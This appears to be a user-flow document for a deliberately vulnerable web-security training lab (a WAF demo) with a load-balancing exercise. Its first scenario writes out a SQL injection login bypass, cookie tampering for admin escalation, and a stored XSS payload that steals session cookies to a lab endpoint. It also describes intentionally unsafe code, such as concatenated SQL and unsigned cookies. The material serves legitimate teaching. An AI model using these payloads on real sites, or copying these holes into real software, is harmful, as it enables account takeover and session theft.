# User Flows

## App Startup
Participants open `http://<host>:6060` → `public/index.html` → lab landing page with links to all scenarios.

## Scenario 1 — Web Attack Chain (WAF Demo)

### 1. SQL Injection (Login Bypass)
1. User opens `/login.html`
2. Enters `admin' --` in username, blank password
3. POST `/api/login` builds raw SQL via string concat → `SELECT id, user, role FROM users WHERE user = 'admin' --' AND pass = ''`
4. `--` comments out password check → returns admin row
5. Server sets unsigned `dpwaf_session` cookie → redirects to `/dashboard`

### 2. Broken Access Control (Cookie Tampering)
1. User logs in as `guest`/`guest` (standard user)
2. Dashboard shows standard-user sidebar (Dashboard, Profile, Tickets, Help)
3. Dashboard prints admin cookie value + shows escalation instructions
4. User edits `dpwaf_session` cookie in DevTools → replaces with admin cookie
5. Reload → admin sidebar appears + admin panels (User Management, All Feedback)

### 3. Stored XSS → Session Theft → Takeover
1. Attacker opens `/attacker.html` (beacon listener, polls `/api/collect/list`)
2. Attacker submits feedback at `/feedback.html` with XSS payload:
   ```html
   <script>new Image().src='/api/collect?c='+encodeURIComponent(document.cookie)</script>
   ```
3. POST `/api/feedback` stores payload unsanitized in `feedbackEntries`
4. Admin visits `/dashboard` → "All Feedback" panel renders message unescaped
5. XSS payload fires in admin's browser → sends `document.cookie` to `/api/collect`
6. Attacker's console receives the beacon → shows stolen `dpwaf_session`
7. Attacker clicks cookie → "Replay as admin" → POST `/api/replay` confirms takeover

## Scenario 2 — Capacity & Load Balancing

### Phase 1 — Single Origin (Without Load Balancer)
1. Instructor starts one origin: `npm start` (port 6060)
2. Participants open `http://<host>:6060/capacity.html`
3. Each `POST /api/room/enter` checks `activeIps` Map
4. First 2 distinct IPs → `{ok: true, reused: false}`
5. 3rd+ distinct IP → HTTP 503 `{ok: false, message: "Server overloaded..."}`
6. Same IP refreshing → `{ok: true, reused: true}` (no new slot consumed)
7. Slots expire after 30s (`SESSION_TTL_MS`)

### Phase 2 — With Load Balancer
1. Instructor starts 3 origins on ports 6061-6063 + balancer on 6060
2. Participants reload `http://<host>:6060/capacity.html` (now behind balancer)
3. Balancer picks origin via IP Hash (sticky: same IP → same origin)
4. Each origin still has 2-slot limit → 3 origins × 2 slots = 6 max
5. Dashboard shows "Served by origin: origin-1/2/3" → proves load spreading
6. DDoS scenario: instructor explains DP WAF per-IP flood blocking on top

## Data Flow / API Seam

| Step | From | To | Method | Data |
|------|------|----|--------|------|
| Login form | Browser | `/api/login` | POST | `{username, password}` |
| Dashboard | Browser | `/dashboard` | GET | Cookie `dpwaf_session` |
| Feedback submit | Browser | `/api/feedback` | POST | `{name, message}` |
| XSS beacon | Admin browser | `/api/collect?c=` | GET | Stolen cookie in query |
| Beacon list | Attacker page | `/api/collect/list` | GET | — |
| Cookie replay | Attacker page | `/api/replay` | POST | `{token}` |
| Enter room | capacity page | `/api/room/enter` | POST | — |
| Leave room | capacity page | `/api/room/leave` | POST | — |
| Room status | capacity page | `/api/room/status` | GET | — |